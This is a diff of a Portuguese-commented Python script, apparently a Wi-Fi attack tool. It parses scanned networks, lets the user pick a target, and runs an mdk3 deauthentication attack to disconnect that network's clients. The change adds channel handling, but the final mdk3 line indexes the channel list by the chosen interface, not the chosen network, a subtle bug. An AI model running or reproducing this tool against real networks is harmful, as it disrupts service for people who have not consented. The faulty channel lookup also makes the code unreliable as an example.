@@ -69,7 +69,7 @@ interfaces_disponiveis = []
 cont = 1
 for linha in txt:
     split = linha.split()
-    if split[0] != "Kernel" and split[0] != "Iface" and split[0] != "lo" and split[0] != "Tabela" and split[0] != "Table":
+    if split[0] != "Kernel" and split[0] != "Iface" and split[0] != "lo":
         print([cont], split[0])
         interfaces_disponiveis.append(split[0])
         cont += 1
@@ -100,13 +100,14 @@ time.sleep(1)
 print()
 input('Enter para continuar: ')
 os.system("clear")
-bssid = pd.read_csv("BSSID-01.csv", usecols=["BSSID", " ESSID"])
+bssid = pd.read_csv("BSSID-01.csv", usecols=["BSSID", " channel", " ESSID"])
 bssid = str(bssid)
 
 # Criando txt com os dados da coluna do dataframe (eu preferi manipular um txt, noobzao)
 # Para cada linha eu dou um split. Cada palavra dentro da linha possui um index
 # Então uso isso para printar os nomes das redes e também para jogar o BSSID em uma lista
 MAC = []
+canal = []
 arquivo = open('nomes-bssid.txt','w')
 arquivo.write(bssid)
 arquivo = open('nomes-bssid.txt','r')
@@ -115,16 +116,17 @@ for linha in arquivo:
     try:
         valores = linha.split("\n")
         valores = linha.split()
-        if " ".join(valores[2:]) != "" and " ".join(valores[2:]) != "MAC NaN" and " ".join(valores[2:]) != "NaN":
-            print([cont], " ".join(valores[2:]))
+        if " ".join(valores[3:]) != "" and " ".join(valores[3:]) != "MAC NaN" and " ".join(valores[3:]) != "NaN" and " ".join(valores[3:]) != "Power NaN":
+            print([cont], " ".join(valores[3:]))
             MAC.append(valores[1])
+            canal.append(valores[2])
             cont += 1
     except:
         pass
     
 print()
 rede = int(input("Selecione a rede: ")) - 1
-os.popen(f"mdk3 {interfaces_disponiveis[interface_selecionada]} d {MAC[rede]} ")
+os.popen(f"mdk3 {interfaces_disponiveis[interface_selecionada]} d {MAC[rede]} -c {canal[interface_selecionada]}")
 print()
 print("[+] Desautenticação em andamento >>>")
 print(42 * "-")
